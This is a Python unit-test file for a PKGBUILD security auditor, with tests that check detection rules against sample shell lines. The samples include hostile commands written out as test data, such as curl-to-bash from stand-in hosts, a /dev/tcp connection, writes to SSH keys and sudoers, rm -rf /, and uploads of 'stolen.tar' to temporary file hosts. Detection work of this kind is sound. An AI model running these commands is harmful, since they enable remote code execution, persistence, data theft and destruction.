import unittest

from atlas.gems.arch import pkgbuild_audit as audit


def rules_for(text):
    return {f['rule'] for f in audit.scan(text)}


# A normal, benign PKGBUILD — must produce ZERO findings (false-positive guard).
CLEAN_PKGBUILD = """\
# Maintainer: Someone <someone@example.com>
pkgname=foo
pkgver=1.2.3
pkgrel=1
arch=('x86_64')
url="https://example.com/foo"
depends=('curl' 'glibc')
source=("https://example.com/foo-$pkgver.tar.gz")
sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')

build() {
  cd "$srcdir/foo-$pkgver"
  ./configure --prefix=/usr
  make
}

package() {
  cd "$srcdir/foo-$pkgver"
  make DESTDIR="$pkgdir" install
  rm -rf "$srcdir/foo-$pkgver/tmp"
  chmod 755 "$pkgdir/usr/bin/foo"
}
"""


class CleanPkgbuildTest(unittest.TestCase):
    def test_benign_pkgbuild_has_no_findings(self):
        self.assertEqual([], audit.scan(CLEAN_PKGBUILD))

    def test_empty_text(self):
        self.assertEqual([], audit.scan(''))
        self.assertEqual([], audit.scan(None))


class RuleFiringTest(unittest.TestCase):
    def test_pipe_to_shell(self):
        self.assertIn('pipe_to_shell', rules_for('curl https://evil.sh/x | bash'))
        self.assertIn('pipe_to_shell', rules_for('sh -c "$(wget -O- http://evil/x)"'))

    def test_base64(self):
        self.assertIn('base64', rules_for('echo aGk= | base64 -d | sh'))

    def test_base64_blob_flagged_but_not_hex_checksum(self):
        # a real base64 blob (>=40 chars, has +,/,=) fires
        self.assertIn('base64_blob', rules_for("payload='TVqQAAMAAAAEAAAA//8AALgAA+ABcQK3kAAAAEAAAA+B/gK3kw=='"))
        # a 64-char lowercase-hex sha256sum does NOT
        self.assertNotIn('base64_blob',
                         rules_for("sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')"))

    def test_eval_and_hex_escapes(self):
        self.assertIn('eval', rules_for('eval "$payload"'))
        self.assertIn('hex_escapes', rules_for('printf "\\x90\\x90\\x90\\x90\\x90"'))

    def test_network_cmd_fires_on_invocation_not_on_dep_name(self):
        self.assertIn('network_cmd', rules_for('curl -sL http://evil/x -o /tmp/x'))
        self.assertIn('network_cmd', rules_for('cat </dev/tcp/10.0.0.1/4444'))
        # 'curl' as a dependency / pkgname must NOT trip it
        self.assertNotIn('network_cmd', rules_for("depends=('curl' 'wget')"))
        self.assertNotIn('network_cmd', rules_for('pkgname=curl'))

    def test_sensitive_paths(self):
        self.assertIn('sensitive_path', rules_for('echo "$KEY" >> ~/.ssh/authorized_keys'))
        self.assertIn('sensitive_path', rules_for('cp x /etc/sudoers.d/foo'))
        self.assertIn('sensitive_path', rules_for('echo evil >> ~/.bashrc'))

    def test_setuid(self):
        self.assertIn('setuid', rules_for('chmod 4755 "$pkgdir/usr/bin/foo"'))
        self.assertIn('setuid', rules_for('chmod u+s /usr/bin/foo'))
        # normal mode does not
        self.assertNotIn('setuid', rules_for('chmod 644 "$pkgdir/etc/foo.conf"'))

    def test_sudo(self):
        self.assertIn('sudo', rules_for('sudo rm /etc/important'))

    def test_rm_rf_targets_only_dangerous_paths(self):
        self.assertIn('rm_rf', rules_for('rm -rf ~'))
        self.assertIn('rm_rf', rules_for('rm -rf /'))
        self.assertIn('rm_rf', rules_for('rm -rf "$HOME/.config"'))
        # the ubiquitous build-dir cleanup must NOT fire
        self.assertNotIn('rm_rf', rules_for('rm -rf "$srcdir/foo"'))
        self.assertNotIn('rm_rf', rules_for('rm -rf "${pkgdir}/usr/share/doc"'))

    # Atomic Arch (June 2026) campaign-specific rules:

    def test_npm_install_unknown(self):
        self.assertIn('npm_install_unknown', rules_for('npm install atomic-lockfile minimist chalk'))
        self.assertIn('npm_install_unknown', rules_for('bun install js-digest'))
        self.assertIn('npm_install_unknown', rules_for('pnpm add some-pkg'))
        self.assertIn('npm_install_unknown', rules_for('yarn add malware'))
        self.assertIn('npm_install_unknown', rules_for('npm i some-package'))
        # 'npm run' and bare 'npm --version' must NOT fire
        self.assertNotIn('npm_install_unknown', rules_for('npm run build'))
        self.assertNotIn('npm_install_unknown', rules_for('npm --version'))
        self.assertNotIn('npm_install_unknown', rules_for("depends=('npm')"))

    def test_skip_checksum(self):
        self.assertIn('skip_checksum', rules_for("sha256sums=('SKIP')"))
        self.assertIn('skip_checksum', rules_for('b2sums=("SKIP" "abc123")'))
        # a PKGBUILD that just mentions the word SKIP in a comment must NOT fire
        self.assertNotIn('skip_checksum', rules_for('# do not use SKIP unless it is a VCS'))

    def test_temp_upload_service(self):
        self.assertIn('temp_upload_service', rules_for('curl https://temp.sh/upload -T stolen.tar'))
        self.assertIn('temp_upload_service', rules_for('wget transfer.sh/upload'))
        self.assertIn('temp_upload_service', rules_for('curl https://0x0.st -F file=@data'))
        self.assertIn('temp_upload_service', rules_for('nc termbin.com 9999'))

    def test_systemd_service_install(self):
        self.assertIn('systemd_service_install', rules_for('systemctl enable myservice'))
        self.assertIn('systemd_service_install', rules_for('systemctl start myservice'))
        self.assertIn('systemd_service_install', rules_for('systemctl daemon-reload'))


class ScanMechanicsTest(unittest.TestCase):
    def test_comment_lines_are_skipped(self):
        self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))

    def test_findings_carry_line_numbers_and_are_sorted(self):
        text = "pkgname=foo\ncurl -sL http://evil | bash\neval \"$x\"\n"
        findings = audit.scan(text)
        self.assertTrue(findings)
        line_nos = [f['line_no'] for f in findings]
        self.assertEqual(line_nos, sorted(line_nos))
        self.assertTrue(all('why' in f and 'severity' in f for f in findings))

    def test_diff_empty_when_identical(self):
        self.assertEqual('', audit.diff('pkgname=foo\npkgver=1\n', 'pkgname=foo\npkgver=1\n'))

    def test_diff_shows_added_and_removed(self):
        d = audit.diff('pkgver=1\n', 'pkgver=2\ncurl x | bash\n')
        self.assertIn('-pkgver=1', d)
        self.assertIn('+pkgver=2', d)
        self.assertIn('+curl x | bash', d)

    def test_diff_truncates_long_output(self):
        old = '\n'.join(f'line{i}' for i in range(500))
        new = '\n'.join(f'changed{i}' for i in range(500))
        d = audit.diff(old, new, max_lines=50)
        self.assertIn('diff truncated', d)
        self.assertLessEqual(len(d.splitlines()), 51)

    def test_summarize(self):
        findings = audit.scan("curl -sL http://evil | bash\n")
        s = audit.summarize(findings)
        self.assertEqual(s['total'], s['warn'] + s['info'])
        self.assertGreaterEqual(s['warn'], 1)

    def test_diff_lines_empty_when_identical(self):
        self.assertEqual([], audit.diff_lines('pkgver=1\n', 'pkgver=1\n'))

    def test_diff_lines_classifies_each_line(self):
        rows = audit.diff_lines('pkgver=1\n', 'pkgver=2\n')
        kinds = {r['kind'] for r in rows}
        self.assertEqual({'meta', 'hunk', 'add', 'del'}, kinds)
        added = [r['text'] for r in rows if r['kind'] == 'add']
        removed = [r['text'] for r in rows if r['kind'] == 'del']
        self.assertTrue(any(t.startswith('+pkgver=2') for t in added))
        self.assertTrue(any(t.startswith('-pkgver=1') for t in removed))
        # context lines (unchanged) keep their leading space and are tagged 'ctx'
        ctx = audit.diff_lines('a\nb\nc\n', 'a\nX\nc\n')
        self.assertTrue(any(r['kind'] == 'ctx' and r['text'] == ' a' for r in ctx))

    def test_diff_lines_truncates_with_a_meta_marker(self):
        old = '\n'.join(f'line{i}' for i in range(500))
        new = '\n'.join(f'changed{i}' for i in range(500))
        rows = audit.diff_lines(old, new, max_lines=50)
        self.assertEqual(51, len(rows))                       # max_lines + the truncation marker
        self.assertEqual('meta', rows[-1]['kind'])
        self.assertIn('truncated', rows[-1]['text'])


if __name__ == '__main__':
    unittest.main()
